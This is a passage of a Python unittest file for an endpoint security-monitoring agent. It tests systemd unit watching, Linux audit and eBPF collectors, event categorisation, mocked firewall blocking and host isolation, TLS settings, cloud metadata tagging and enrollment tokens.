        self.assertEqual(rec["preset"], "enabled")
        self.assertNotIn("load", rec)
        naive = parse_systemctl_line("sshd.service enabled enabled")
        self.assertEqual(naive["load"], "enabled")
        enriched = _enrich_enabled(
            [rec],
            [{"unit": "sshd.service", "load": "loaded", "active": "active", "sub": "running"}],
        )
        self.assertEqual(enriched[0]["load"], "loaded")
        self.assertEqual(enriched[0]["active"], "active")
        self.assertEqual(enriched[0]["state"], "enabled")

    def test_systemd_watcher_baseline_then_state_and_add(self):
        from colsoft_tools.linux_monitors import SystemdUnitWatcher

        logs: list = []
        watcher = SystemdUnitWatcher(log=lambda msg: logs.append(msg))
        baseline = {
            "status": "OK",
            "units": [
                {
                    "unit": "cron.service",
                    "load": "loaded",
                    "active": "active",
                    "sub": "running",
                }
            ],
            "timers": [
                {
                    "unit": "apt-daily.timer",
                    "load": "loaded",
                    "active": "active",
                    "sub": "waiting",
                }
            ],
            "enabled": [],
        }
        with patch(
            "colsoft_tools.linux_monitors.linux_systemd_units",
            return_value=baseline,
        ):
            self.assertEqual(watcher.tick(), [])
        self.assertTrue(any("baseline" in msg for msg in logs))

        changed = {
            "status": "OK",
            "units": [
                {
                    "unit": "cron.service",
                    "load": "loaded",
                    "active": "inactive",
                    "sub": "dead",
                }
            ],
            "timers": [
                {
                    "unit": "apt-daily.timer",
                    "load": "loaded",
                    "active": "inactive",
                    "sub": "dead",
                }
            ],
            "enabled": [{"unit": "evil.service"}],
        }
        with patch(
            "colsoft_tools.linux_monitors.linux_systemd_units",
            return_value=changed,
        ):
            events = watcher.tick()
        by_change = {(e.get("change"), e.get("unit")) for e in events}
        self.assertIn(("state", "cron.service"), by_change)
        self.assertIn(("state", "apt-daily.timer"), by_change)
        self.assertIn(("added", "evil.service"), by_change)

    def test_tools_unsupported_or_linux_ok(self):
        from colsoft_tools.linux_collectors import (
            linux_ebpf,
            linux_lsm,
            linux_netlink,
            linux_packages,
            linux_proc_metrics,
            linux_syslog,
        )
        from colsoft_tools.protocol import resolve_command
        from colsoft_tools.tool_catalog import ALLOWED_TOOLS, LINUX_TOOLS, tool_category

        self.assertEqual(resolve_command("get_linux_ebpf"), "linux_ebpf")
        self.assertEqual(resolve_command("get_selinux_status"), "linux_lsm")
        self.assertEqual(resolve_command("get_apparmor_status"), "linux_lsm")
        self.assertEqual(resolve_command("get_defender_status"), "windows_defender")
        for name in LINUX_TOOLS:
            self.assertIn(name, ALLOWED_TOOLS)
            self.assertEqual(tool_category(name), "linux")
        self.assertNotIn("linux_lsm", LINUX_TOOLS)
        self.assertEqual(tool_category("linux_lsm"), "security")

        if platform.system() != "Linux":
            self.assertEqual(linux_ebpf()["status"], "UNSUPPORTED")
            self.assertEqual(linux_proc_metrics()["status"], "UNSUPPORTED")
            self.assertEqual(linux_lsm()["status"], "UNSUPPORTED")
            return

        proc = linux_proc_metrics(cpu_interval=0.05)
        self.assertEqual(proc["status"], "OK")
        self.assertIn("percent", proc.get("cpu") or {})
        self.assertEqual(proc.get("source"), "/proc+/sys")
        self.assertIn("volumes", proc)

        from colsoft_tools.observability import get_system_metrics

        metrics = get_system_metrics(cpu_interval=0.05)
        self.assertEqual(metrics["status"], "OK")
        self.assertEqual(metrics.get("source"), "/proc+/sys")
        self.assertEqual(metrics["tool"], "system_metrics")
        self.assertIsInstance((metrics.get("memory") or {}).get("used"), int)
        net = metrics.get("network_io") or {}
        self.assertIsInstance(net, dict)
        self.assertIn("bytes_sent", net)
        self.assertIn("bytes_recv", net)
        self.assertIn("packets_sent", net)
        self.assertIn("errin", net)
        self.assertIsInstance(net.get("interfaces"), list)
        tcp = metrics.get("tcp_connections") or {}
        self.assertIn("listen", tcp)
        self.assertIn("established", tcp)
        self.assertIn("udp", tcp)

        lsm = linux_lsm()
        self.assertEqual(lsm["status"], "OK")
        self.assertIn("selinux", lsm)
        self.assertIn("apparmor", lsm)

        ebpf = linux_ebpf()
        self.assertIn(ebpf["status"], ("OK", "ERROR"))
        self.assertIn("of_interest", ebpf)
        if ebpf["status"] == "OK":
            self.assertEqual(ebpf.get("count"), ebpf.get("program_count"))

        net = linux_netlink()
        self.assertEqual(net["status"], "OK")

        pkgs = linux_packages(include_hash=False, max_packages=20)
        self.assertEqual(pkgs["status"], "OK")
        self.assertGreaterEqual(pkgs.get("count") or 0, 1)

        log = linux_syslog("journal", max_lines=5)
        self.assertIn(log["status"], ("OK", "ERROR"))
        self.assertEqual(log.get("channel"), "system")

        from colsoft_tools.linux_collectors import SYSLOG_CHANNELS, linux_syslog_bundle

        self.assertEqual(log.get("known_channels"), list(SYSLOG_CHANNELS))
        bundled = linux_syslog_bundle(max_per_channel=2)
        self.assertEqual(bundled["status"], "OK")
        for ch in SYSLOG_CHANNELS:
            self.assertIn(ch, bundled.get("channels") or {})

    def test_linux_monitors_noop_off_linux(self):
        from colsoft_tools.linux_monitors import spawn_linux_tasks

        if platform.system() == "Linux":
            self.skipTest("este caso cubre el no-op fuera de Linux")
        tasks = spawn_linux_tasks(
            {"linux": {"auditd": {"enabled": True}}},
            sink=lambda e: None,
        )
        self.assertEqual(tasks, [])

    def test_linux_monitors_disabled_on_linux(self):
        from colsoft_tools.linux_monitors import spawn_linux_tasks

        if platform.system() != "Linux":
            self.skipTest("arranca tasks solo en Linux")
        tasks = spawn_linux_tasks({"linux": {}}, sink=lambda e: None)
        self.assertEqual(tasks, [])
        tasks = spawn_linux_tasks(
            {"linux": {"auditd": {"enabled": False}, "systemd": {"enabled": False}}},
            sink=lambda e: None,
        )
        self.assertEqual(tasks, [])

    def test_linux_logger_taxonomy_matches_windows_pattern(self):
        from colsoft_tools.linux_monitors import _linux_event
        from colsoft_tools.tool_catalog import tool_category

        self.assertEqual(tool_category("linux_ebpf"), "linux")
        self.assertEqual(tool_category("linux_auditd"), "linux")

        info = _linux_event(
            "linux.audit",
            severity="info",
            tool="linux_auditd",
            summary="SYSCALL pid=1 bash",
            audit_type="SYSCALL",
        )
        self.assertEqual(info["category"], "linux")
        high = _linux_event(
            "linux.audit",
            severity="high",
            tool="linux_auditd",
            summary="AVC denied",
            audit_type="AVC",
        )
        self.assertEqual(high["category"], "security")
        unit = _linux_event(
            "linux.unit_change",
            severity="medium",
            tool="linux_systemd_units",
            summary="added cron.service",
            unit="cron.service",
        )
        self.assertEqual(unit["category"], "security")

        captured = []

        def fake_event(*_a, **kwargs):
            captured.append(kwargs)

        with patch("lib.metrics_logger.log_agent_event", side_effect=fake_event):
            log_tool_execution("agt", "get_linux_ebpf", success=True)
            log_event_push(
                "agt",
                {
                    "event": {
                        "event_type": "linux.audit",
                        "severity": "info",
                        "audit_type": "SYSCALL",
                        "exe": "/usr/bin/bash",
                        "comm": "bash",
                    }
                },
            )
            log_event_push(
                "agt",
                {
                    "event": {
                        "event_type": "linux.audit",
                        "severity": "high",
                        "audit_type": "AVC",
                    }
                },
            )
            log_event_push(
                "agt",
                {
                    "event": {
                        "event_type": "linux.unit_change",
                        "severity": "medium",
                        "unit": "cron.service",
                        "change": "state",
                        "active": "inactive",
                        "sub": "dead",
                    }
                },
            )
            log_event_push(
                "agt",
                {
                    "event": {
                        "event_type": "linux.netlink",
                        "severity": "info",
                        "iface": "eth0",
                    }
                },
            )

        tool_log, audit_info, audit_high, unit_log, netlink = captured
        self.assertEqual(tool_log["event_type"], "audit")
        self.assertEqual(tool_log["category"], "linux")
        self.assertEqual(tool_log["subcategory"], "linux_ebpf")
        self.assertEqual(tool_log["data"]["tool"], "linux_ebpf")
        self.assertEqual(tool_log["data"]["command"], "get_linux_ebpf")

        self.assertEqual(audit_info["event_type"], "activity")
        self.assertEqual(audit_info["category"], "linux")
        self.assertEqual(audit_info["subcategory"], "audit")
        self.assertEqual(audit_info["data"]["exe"], "/usr/bin/bash")
        self.assertEqual(audit_info["data"]["comm"], "bash")

        self.assertEqual(audit_high["event_type"], "audit")
        self.assertEqual(audit_high["category"], "security")
        self.assertEqual(audit_high["subcategory"], "audit")

        self.assertEqual(unit_log["event_type"], "audit")
        self.assertEqual(unit_log["category"], "security")
        self.assertEqual(unit_log["subcategory"], "unit_change")
        self.assertEqual(unit_log["data"]["unit"], "cron.service")
        self.assertEqual(unit_log["data"]["change"], "state")
        self.assertEqual(unit_log["data"]["active"], "inactive")
        self.assertEqual(unit_log["data"]["sub"], "dead")

        self.assertEqual(netlink["event_type"], "activity")
        self.assertEqual(netlink["category"], "linux")
        self.assertEqual(netlink["subcategory"], "netlink")
        self.assertEqual(netlink["data"]["iface"], "eth0")

    def test_linux_audit_entries_kept_when_compacted(self):
        from colsoft_tools.data_plane import (
            compact_command_result,
            compact_event_for_otlp,
        )

        fat = {
            "tool": "linux_auditd",
            "status": "OK",
            "count": 40,
            "entries": [
                {
                    "type": "SYSCALL",
                    "pid": "4521",
                    "exe": "/usr/bin/bash",
                    "comm": "bash",
                    "syscall": "59",
                    "success": "yes",
                    "msg": "audit(1710000000.120:42)",
                    "raw": "type=SYSCALL " + ("x" * 300),
                    "ts": "2024-03-09T12:00:00+00:00",
                }
                for _ in range(40)
            ],
        }
        compact = compact_event_for_otlp(
            {
                "event_type": "telemetry.tool_result",
                "category": "linux",
                "tool": "linux_auditd",
                "result": fat,
            }
        )
        entries = (compact.get("result") or {}).get("entries") or []
        self.assertLessEqual(len(entries), 12)
        self.assertEqual(entries[0].get("type"), "SYSCALL")
        self.assertEqual(entries[0].get("exe"), "/usr/bin/bash")
        self.assertEqual(entries[0].get("comm"), "bash")
        self.assertTrue((compact.get("result") or {}).get("truncated"))

        ws = compact_command_result(fat, tool="linux_auditd")
        ws_entries = ws.get("entries") or []
        self.assertLessEqual(len(ws_entries), 3)
        self.assertEqual(ws_entries[0].get("type"), "SYSCALL")
        self.assertEqual(ws_entries[0].get("comm"), "bash")
        self.assertNotIn("raw", ws_entries[0])

    def test_linux_otlp_ingest_taxonomy(self):
        from otlp import _ingest_log_record

        captured = []
        with patch("otlp.log_agent_event", side_effect=lambda **k: captured.append(k)):
            with patch("otlp.save_execution_result_to_json"):
                _ingest_log_record(
                    {},
                    {
                        "severityText": "INFO",
                        "body": {"stringValue": "telemetry.tool_result linux_ebpf"},
                        "attributes": [
                            {
                                "key": "event.type",
                                "value": {"stringValue": "telemetry.tool_result"},
                            },
                            {
                                "key": "tool",
                                "value": {"stringValue": "linux_ebpf"},
                            },
                            {
                                "key": "category",
                                "value": {"stringValue": "linux"},
                            },
                        ],
                    },
                )
                _ingest_log_record(
                    {},
                    {
                        "severityText": "INFO",
                        "body": {"stringValue": "linux.audit"},
                        "attributes": [
                            {
                                "key": "event.type",
                                "value": {"stringValue": "linux.audit"},
                            },
                            {
                                "key": "tool",
                                "value": {"stringValue": "linux_auditd"},
                            },
                            {
                                "key": "category",
                                "value": {"stringValue": "linux"},
                            },
                            {
                                "key": "event.payload",
                                "value": {
                                    "stringValue": '{"event_type":"linux.audit","severity":"info","audit_type":"SYSCALL"}'
                                },
                            },
                        ],
                    },
                )
                _ingest_log_record(
                    {},
                    {
                        "severityText": "ERROR",
                        "body": {"stringValue": "linux.audit"},
                        "attributes": [
                            {
                                "key": "event.type",
                                "value": {"stringValue": "linux.audit"},
                            },
                            {
                                "key": "tool",
                                "value": {"stringValue": "linux_auditd"},
                            },
                            {
                                "key": "category",
                                "value": {"stringValue": "security"},
                            },
                            {
                                "key": "event.payload",
                                "value": {
                                    "stringValue": '{"event_type":"linux.audit","severity":"high","audit_type":"AVC"}'
                                },
                            },
                        ],
                    },
                )
                _ingest_log_record(
                    {},
                    {
                        "severityText": "WARN",
                        "body": {"stringValue": "linux.unit_change"},
                        "attributes": [
                            {
                                "key": "event.type",
                                "value": {"stringValue": "linux.unit_change"},
                            },
                            {
                                "key": "tool",
                                "value": {"stringValue": "linux_systemd_units"},
                            },
                            {
                                "key": "category",
                                "value": {"stringValue": "security"},
                            },
                        ],
                    },
                )

        tool_log, audit_info, audit_high, unit_log = captured
        self.assertEqual(tool_log["event_type"], "metrics")
        self.assertEqual(tool_log["category"], "linux")
        self.assertEqual(tool_log["subcategory"], "linux_ebpf")

        self.assertEqual(audit_info["event_type"], "activity")
        self.assertEqual(audit_info["category"], "linux")
        self.assertEqual(audit_info["subcategory"], "audit")

        self.assertEqual(audit_high["event_type"], "audit")
        self.assertEqual(audit_high["category"], "security")
        self.assertEqual(unit_log["event_type"], "audit")
        self.assertEqual(unit_log["category"], "security")
        self.assertEqual(unit_log["subcategory"], "unit_change")


class TestRemediationOs(unittest.TestCase):
    def test_direction_and_windows_process_name(self):
        from colsoft_tools.remediation import (
            _normalize_direction,
            _process_name_matches,
        )

        self.assertEqual(_normalize_direction("in"), "input")
        self.assertEqual(_normalize_direction("outbound"), "output")
        self.assertIsNone(_normalize_direction("sideways"))
        self.assertTrue(_process_name_matches("notepad", "notepad.exe", ""))
        self.assertTrue(_process_name_matches("sleep", "sleep.exe", r"C:\sleep.exe"))
        self.assertFalse(_process_name_matches("sleep", "svchost.exe", ""))

    def test_block_ip_windows_uses_netsh(self):
        from colsoft_tools import remediation

        fake = MagicMock(returncode=0, stderr="", stdout="Ok.")
        with patch.object(remediation.platform, "system", return_value="Windows"), patch.object(
            remediation, "_is_privileged", return_value=True
        ), patch.object(remediation.shutil, "which", return_value="C:\\Windows\\System32\\netsh.exe"), patch.object(
            remediation, "_run", return_value=fake
        ) as run:
            out = remediation.block_ip("203.0.113.1", direction="in")
        self.assertEqual(out["status"], "OK")
        self.assertEqual(out["os"], "Windows")
        self.assertEqual(out["backend"], "netsh")
        joined = " ".join(" ".join(c.args[0]) for c in run.call_args_list)
        self.assertIn("advfirewall", joined)
        self.assertIn("203.0.113.1", joined)
        self.assertIn("robin-block-in-203.0.113.1", joined)

    def test_unblock_ip_windows_deletes_block_rule(self):
        from colsoft_tools import remediation

        fake = MagicMock(returncode=0, stderr="", stdout="Ok.")
        with patch.object(remediation.platform, "system", return_value="Windows"), patch.object(
            remediation, "_is_privileged", return_value=True
        ), patch.object(remediation.shutil, "which", return_value="C:\\Windows\\System32\\netsh.exe"), patch.object(
            remediation, "_run", return_value=fake
        ) as run:
            out = remediation.unblock_ip("203.0.113.1", direction="in")
        self.assertEqual(out["status"], "OK")
        joined = " ".join(" ".join(c.args[0]) for c in run.call_args_list)
        self.assertIn("delete", joined)
        self.assertIn("robin-block-in-203.0.113.1", joined)
        self.assertNotIn("robin-unblock", joined)

    def test_isolate_host_windows_uses_netsh(self):
        from colsoft_tools import remediation

        fake = MagicMock(returncode=0, stderr="", stdout="Ok.")
        with tempfile.TemporaryDirectory() as td:
            state = os.path.join(td, "remediation_state.json")
            with patch.object(remediation.platform, "system", return_value="Windows"), patch.object(
                remediation, "_is_privileged", return_value=True
            ), patch.object(
                remediation.shutil, "which", return_value="C:\\Windows\\System32\\netsh.exe"
            ), patch.object(remediation, "_run", return_value=fake), patch.object(
                remediation, "_state_path", return_value=state
            ), patch.object(remediation.threading, "Thread"):
                out = remediation.isolate_host(
                    duration_seconds=30, manager_host="203.0.113.10"
                )
        self.assertEqual(out["status"], "OK")
        self.assertEqual(out["os"], "Windows")
        self.assertEqual(out["backend"], "netsh")
        self.assertEqual(out["manager_host"], "203.0.113.10")
        self.assertEqual(out["restore_after_s"], 30.0)
        from datetime import datetime, timezone, timedelta

        exp = datetime.fromisoformat(str(out["expires_at"]).replace("Z", "+00:00"))
        self.assertGreater(exp, datetime.now(timezone.utc) + timedelta(seconds=10))

    def test_manager_host_from_websocket_url(self):
        from colsoft_tools.remediation import manager_host_from_config

        self.assertEqual(
            manager_host_from_config(
                {"websocket_url": "ws://203.0.113.10:8000/ws/colsoft-tools"}
            ),
            "203.0.113.10",
        )
        self.assertEqual(
            manager_host_from_config({"websocket_url": "ws://127.0.0.1:8000/ws"}),
            "127.0.0.1",
        )
        self.assertIsNone(manager_host_from_config({}))

    def test_restore_isolation_reports_own_tool_name(self):
        from colsoft_tools import remediation

        with tempfile.TemporaryDirectory() as td:
            state = os.path.join(td, "remediation_state.json")
            with patch.object(remediation, "_state_path", return_value=state):
                out = remediation.restore_isolation()
        self.assertEqual(out["tool"], "restore_isolation")
        self.assertEqual(out["status"], "OK")
        self.assertFalse(out["restored"])


class TestWsAuthHandshake(unittest.IsolatedAsyncioTestCase):
    async def test_wait_for_auth_response_skips_control_plane_noise(self):
        from controllers import wait_for_auth_response

        class FakeWS:
            def __init__(self):
                self.msgs = [
                    json.dumps(
                        {
                            "type": "event_push",
                            "event": {"event_type": "health.probe"},
                        }
                    ),
                    json.dumps({"type": "heartbeat"}),
                    json.dumps(
                        {
                            "type": "auth_response",
                            "public_key": "k",
                            "signature": "s",
                        }
                    ),
                ]

            async def receive_text(self):
                return self.msgs.pop(0)

        data = await wait_for_auth_response(FakeWS(), timeout=2.0)
        self.assertEqual(data["type"], "auth_response")
        self.assertEqual(data["signature"], "s")


class TestPackaging(unittest.TestCase):
    def test_packaged_config_is_production_safe(self):
        path = ROOT / "deploy" / "config_client.packaged.json"
        cfg = json.loads(path.read_text(encoding="utf-8"))
        self.assertFalse(cfg.get("allow_insecure_ws"))
        self.assertTrue(cfg.get("require_command_signature"))
        self.assertFalse((cfg.get("policy") or {}).get("allow_high_risk"))
        self.assertIn("service_watch", cfg)
        self.assertTrue(str(cfg.get("websocket_url") or "").startswith("wss://"))
        self.assertFalse(cfg.get("private_key"))
        self.assertFalse((cfg.get("linux") or {}).get("auditd", {}).get("enabled"))
        self.assertFalse((cfg.get("windows") or {}).get("event_log", {}).get("enabled"))
        tb = cfg.get("telemetry_buffer") or {}
        self.assertEqual(int(tb.get("max_total_bytes") or 0), 1073741824)
        self.assertNotIn("max_events", tb)
        tb = cfg.get("telemetry_buffer") or {}
        self.assertEqual(int(tb.get("max_total_bytes") or 0), 1073741824)
        self.assertNotIn("max_events", tb)

    def test_packaging_scripts_exist(self):
        for rel in (
            "deploy/pack-linux.sh",
            "deploy/sign-linux.sh",
            "deploy/sign-windows.ps1",
            "deploy/install-linux.sh",
            "deploy/install-windows.iss",
            "deploy/robin-client-monitor.wxs",
            "deploy/robin-client-monitor.service",
            "deploy/ansible/install-agent.yml",
            "deploy/cloud-init.yaml.example",
            "docs/empaquetado.md",
        ):
            self.assertTrue((ROOT / rel).is_file(), rel)

    def test_systemd_unit_allows_reading_homes(self):
        text = (ROOT / "deploy" / "robin-client-monitor.service").read_text(
            encoding="utf-8"
        )
        self.assertIn("ProtectHome=read-only", text)
        self.assertNotIn("ProtectHome=true", text)

    def test_windows_service_bat_is_cmd_safe(self):
        bat = ROOT / "deploy" / "install-service-windows.bat"
        raw = bat.read_bytes()
        text = raw.decode("ascii")
        self.assertIn("\r\n", text)
        self.assertNotIn("\n", text.replace("\r\n", ""))
        self.assertNotIn("%~1.", text)
        self.assertNotIn("%~dp0.", text)
        self.assertNotIn("echo.", text)
        self.assertIn("%_dp:~0,-1%", text)
        self.assertIn("if defined ARG1", text)
        self.assertIn("AppParameters", text)
        self.assertNotIn("nssm.exe') do set", text)
        self.assertNotIn("C:\\robin-client-monitor", text)

    def test_wix_installs_nssm_in_subdir(self):
        text = (ROOT / "deploy" / "robin-client-monitor.wxs").read_text(
            encoding="utf-8"
        )
        self.assertIn('Directory Id="NssmDir" Name="nssm"', text)
        self.assertIn('ComponentRef Id="NssmFile"', text)
        self.assertNotIn("ProductComponents", text)

    def test_default_audit_log_path_is_results_logs(self):
        from colsoft_tools.config_manager import DEFAULT_AUDIT_LOG_PATH

        self.assertEqual(
            DEFAULT_AUDIT_LOG_PATH, os.path.join("results_logs", "agent_audit.jsonl")
        )
        enroll = (ROOT / "colsoft_tools" / "enrollment.py").read_text(encoding="utf-8")
        self.assertIn('os.path.join("results_logs", "agent_audit.jsonl")', enroll)
        script = (ROOT / "scripts" / "enroll.py").read_text(encoding="utf-8")
        self.assertIn('os.path.join("results_logs", "agent_audit.jsonl")', script)
        self.assertIn("enrollment/identity.key", script)
        self.assertIn("enrollment/identity.pub", script)

    def test_consola_docs_use_nssm_subdir(self):
        md = (ROOT / "docs" / "instalacion-consola.md").read_text(encoding="utf-8")
        self.assertIn(r"nssm\nssm.exe", md)
        self.assertNotIn(
            r'Copy-Item "$src\nssm.exe" $dst\\',
            md,
        )
        pdf = (ROOT / "docs" / "_gen_pdf_consola.py").read_text(encoding="utf-8")
        self.assertIn(r"nssm\\nssm.exe", pdf)
        readme = (ROOT / "README.md").read_text(encoding="utf-8")
        self.assertIn("ProtectHome=read-only", readme)
        client = (ROOT / "README_CLIENT.md").read_text(encoding="utf-8")
        self.assertIn("ProtectHome=read-only", client)


class TestNfrTlsBufferCloud(unittest.TestCase):
    def test_tls_context_pins_12_and_requires_mtls(self):
        import ssl

        from colsoft_tools.tls_util import make_client_ssl_context

        ctx = make_client_ssl_context({"allow_insecure_ws": True})
        self.assertEqual(ctx.minimum_version, ssl.TLSVersion.TLSv1_2)
        with self.assertRaises(RuntimeError):
            make_client_ssl_context({"allow_insecure_ws": False})
        with self.assertRaises(RuntimeError):
            make_client_ssl_context(
                {
                    "allow_insecure_ws": False,
                    "tls_client_cert": "/no/such/cert.pem",
                    "tls_client_key": "/no/such/key.pem",
                }
            )

    def test_imdsv2_tags_host_and_otlp_resource(self):
        from colsoft_tools.cloud_metadata import (
            cloud_otlp_attributes,
            fetch_cloud_metadata,
            reset_cloud_metadata_cache,
        )
        from colsoft_tools.data_plane import _resource
        from colsoft_tools.event_model import host_info, reset_host_cache

        identity = json.dumps(
            {
                "accountId": "123456789012",
                "region": "us-east-1",
                "instanceId": "i-abc",
            }
        ).encode()

        def fake_urlopen(req, timeout=None):
            url = getattr(req, "full_url", None) or str(req)
            class _Resp:
                def __enter__(self):
                    return self

                def __exit__(self, *a):
                    return False

                def read(self):
                    if "/latest/api/token" in url:
                        return b"tok"
                    if url.endswith("/latest/meta-data/instance-id"):
                        return b"i-abc"
                    if url.endswith("/latest/meta-data/instance-type"):
                        return b"t3.micro"
                    if url.endswith("/latest/meta-data/placement/availability-zone"):
                        return b"us-east-1a"
                    if url.endswith("/latest/meta-data/placement/region"):
                        return b"us-east-1"
                    if url.endswith("/latest/dynamic/instance-identity/document"):
                        return identity
                    return b""

            return _Resp()

        reset_cloud_metadata_cache()
        reset_host_cache()
        with patch(
            "colsoft_tools.cloud_metadata.urllib.request.urlopen",
            side_effect=fake_urlopen,
        ):
            tags = fetch_cloud_metadata(force=True)
        self.assertEqual(tags.get("cloud_provider"), "aws")
        self.assertEqual(tags.get("instance_id"), "i-abc")
        self.assertEqual(tags.get("imds"), "v2")
        reset_host_cache()
        host = host_info()
        self.assertEqual(host.get("instance_id"), "i-abc")
        otlp = cloud_otlp_attributes(tags)
        self.assertEqual(otlp.get("cloud.provider"), "aws")
        self.assertEqual(otlp.get("host.id"), "i-abc")
        res = _resource(
            {"agent_id": "agt_1", "tenant_id": "t1", "client_name": "h1"},
            {"agent_id": "agt_1", "event": {"host": tags}},
        )
        keys = {a["key"] for a in res["attributes"]}
        self.assertIn("cloud.provider", keys)
        self.assertIn("host.id", keys)
        reset_cloud_metadata_cache()
        reset_host_cache()

    def test_ssl_cert_reqs_env_one_is_required_not_optional(self):
        import ssl

        from colsoft_tools.tls_util import make_server_ssl_context, parse_ssl_cert_reqs

        self.assertEqual(parse_ssl_cert_reqs("1"), ssl.CERT_REQUIRED)
        self.assertEqual(parse_ssl_cert_reqs("required"), ssl.CERT_REQUIRED)
        self.assertEqual(parse_ssl_cert_reqs("2"), ssl.CERT_REQUIRED)
        self.assertEqual(parse_ssl_cert_reqs("none"), ssl.CERT_NONE)
        self.assertEqual(parse_ssl_cert_reqs("0"), ssl.CERT_NONE)
        self.assertEqual(parse_ssl_cert_reqs(ssl.CERT_OPTIONAL), ssl.CERT_OPTIONAL)
        with self.assertRaises(RuntimeError):
            make_server_ssl_context(
                certfile="server.crt",
                keyfile="server.key",
                ca_certs=None,
                cert_reqs="required",
            )

    def test_load_ssl_settings_refuses_required_without_ca(self):
        from tls_runtime import load_ssl_settings

        env = {
            "SSL_CERTFILE": "/certs/server.crt",
            "SSL_KEYFILE": "/certs/server.key",
            "SSL_CERT_REQS": "required",
        }
        with patch.dict(os.environ, env, clear=False):
            os.environ.pop("SSL_CA_CERTS", None)
            os.environ.pop("ENROLLMENT_BOOTSTRAP_PORT", None)
            with self.assertRaises(RuntimeError):
                load_ssl_settings(strict=True)
            settings = load_ssl_settings(strict=False)
            self.assertEqual(settings.bootstrap_port, 8001)
            self.assertEqual(settings.bootstrap_host, "127.0.0.1")

    def test_enrollment_ignores_forwarded_proto_by_default(self):
        from enrollment import ws_url_for_enrollment

        url = ws_url_for_enrollment(
            host="agentes.ejemplo.com:8000",
            url_scheme="https",
            forwarded_proto="http",
            trust_forwarded=False,
        )
        self.assertTrue(url.startswith("wss://"))
        downgraded = ws_url_for_enrollment(
            host="agentes.ejemplo.com:8000",
            url_scheme="https",
            forwarded_proto="http",
            trust_forwarded=True,
        )
        self.assertTrue(downgraded.startswith("ws://"))

    def test_allocate_identity_dir_uses_client_name_and_avoids_collision(self):
        from colsoft_tools.enrollment import (
            allocate_identity_dir,
            save_identity,
        )

        with tempfile.TemporaryDirectory() as tmp:
            first = allocate_identity_dir("PC Oficina Test", base_root=tmp)
            self.assertTrue(first.endswith(os.path.join("PC-Oficina-Test")))
            save_identity({"agent_id": "agt_1", "client_name": "PC Oficina Test"}, first)
            second = allocate_identity_dir("PC Oficina Test", base_root=tmp)
            self.assertNotEqual(first, second)
            self.assertIn("PC-Oficina-Test_", os.path.basename(second))

    def test_resolve_identity_dir_prefers_active_pointer(self):
        from colsoft_tools.enrollment import (
            read_active_identity_pointer,
            resolve_identity_dir,
            save_identity,
            write_active_identity_pointer,
        )

        with tempfile.TemporaryDirectory() as tmp:
            ident = os.path.join(tmp, "PC-Lab")
            save_identity({"agent_id": "agt_lab", "client_name": "PC-Lab"}, ident)
            write_active_identity_pointer(ident, base_root=tmp)
            resolved = resolve_identity_dir({}, base_root=tmp)
            self.assertEqual(resolved, os.path.abspath(ident))
            self.assertEqual(read_active_identity_pointer(tmp), os.path.abspath(ident))

    def test_mint_enrollment_token_binds_user_and_single_use(self):
        import enrollment as enroll_mod

        with tempfile.TemporaryDirectory() as tmp:
            issued = os.path.join(tmp, "enrollment_issued.json")
            consumed = os.path.join(tmp, "enrollment_consumed.json")
            with patch.object(enroll_mod, "_ISSUED_FILE", issued), patch.object(
                enroll_mod, "_CONSUMED_FILE", consumed
            ), patch.dict(os.environ, {"ENROLLMENT_TOKENS": ""}, clear=False):
                minted = enroll_mod.mint_enrollment_token(
                    "user-a",
                    client_id="bot-a",
                    ttl_seconds=3600,
                )
                self.assertTrue(minted["token"].startswith("enr_"))
                self.assertEqual(minted["user_id"], "user-a")
                ok, owner = enroll_mod._consume_token(minted["token"])
                self.assertTrue(ok)
                self.assertEqual(owner["user_id"], "user-a")
                self.assertEqual(owner["client_id"], "bot-a")
                ok2, _ = enroll_mod._consume_token(minted["token"])
                self.assertFalse(ok2)

    def test_mint_enrollment_token_appends_jsonl_file(self):
        import enrollment as enroll_mod

        with tempfile.TemporaryDirectory() as tmp:
            tok_file = os.path.join(tmp, "enrollment_tokens.jsonl")
            issued = os.path.join(tmp, "enrollment_issued.json")
            consumed = os.path.join(tmp, "enrollment_consumed.json")
            with patch.object(enroll_mod, "_ISSUED_FILE", issued), patch.object(
                enroll_mod, "_CONSUMED_FILE", consumed
            ), patch.dict(
                os.environ,
                {
                    "ENROLLMENT_TOKENS": "",
                    "ENROLLMENT_TOKENS_FILE": tok_file,
                    "ENROLLMENT_TOKENS_AUTO_APPEND": "1",
                },
                clear=False,
            ):
                minted = enroll_mod.mint_enrollment_token(
                    "user-file",
                    client_id="bot-file",
                    ttl_seconds=3600,
                )
                self.assertTrue(os.path.isfile(tok_file))
                with open(tok_file, "r", encoding="utf-8") as fh:
                    lines = [ln for ln in fh if ln.strip()]
                self.assertEqual(len(lines), 1)
                rec = json.loads(lines[0])
                self.assertEqual(rec["token"], minted["token"])
                self.assertEqual(rec["user_id"], "user-file")
                enroll_mod._ISSUED_FILE = issued
                reloaded = enroll_mod._load_issued_from_tokens_file()
                self.assertIn(minted["token"], reloaded)

    def test_mint_enrollment_token_api_requires_jwt(self):
        import jwt as pyjwt
        from fastapi.testclient import TestClient
        from main import app

        key, _priv, pub = _rsa_pair()
        now = datetime.now(timezone.utc)
        token = pyjwt.encode(
            {
                "sub": "user-mint",
                "exp": now + timedelta(hours=1),
                "modelBotId": "bot-mint",
                "roles": ["analyst"],
                "type": "access",
            },
            key,
            algorithm="RS256",
        )
        client = TestClient(app)
        with tempfile.TemporaryDirectory() as tmp:
            issued = os.path.join(tmp, "enrollment_issued.json")
            consumed = os.path.join(tmp, "enrollment_consumed.json")
            import enrollment as enroll_mod

            with patch.object(enroll_mod, "_ISSUED_FILE", issued), patch.object(
                enroll_mod, "_CONSUMED_FILE", consumed
            ), patch("lib.jwt_auth.get_public_key", return_value=pub):
                unauth = client.post("/api/enrollment-tokens")
                self.assertEqual(unauth.status_code, 401)
                resp = client.post(
                    "/api/enrollment-tokens",
                    headers={"Authorization": f"Bearer {token}"},
                )
                self.assertEqual(resp.status_code, 200)
                body = resp.json()
                self.assertTrue(body["token"].startswith("enr_"))
                self.assertEqual(body["user_id"], "user-mint")
                self.assertEqual(body["client_id"], "bot-mint")

    def test_http_get_verifies_tls_by_default(self):
        from colsoft_tools import network_checks as nc

        with patch.object(nc.requests, "get") as get:
            get.return_value.status_code = 200
            out = nc.check_http_service("https://example.test/health", timeout=1)
            self.assertTrue(get.call_args.kwargs.get("verify"))
            self.assertTrue(out.get("tls_verify"))
        with patch.object(nc.requests, "get") as get:
            get.return_value.status_code = 200
            nc.check_http_service("http://127.0.0.1/", timeout=1)
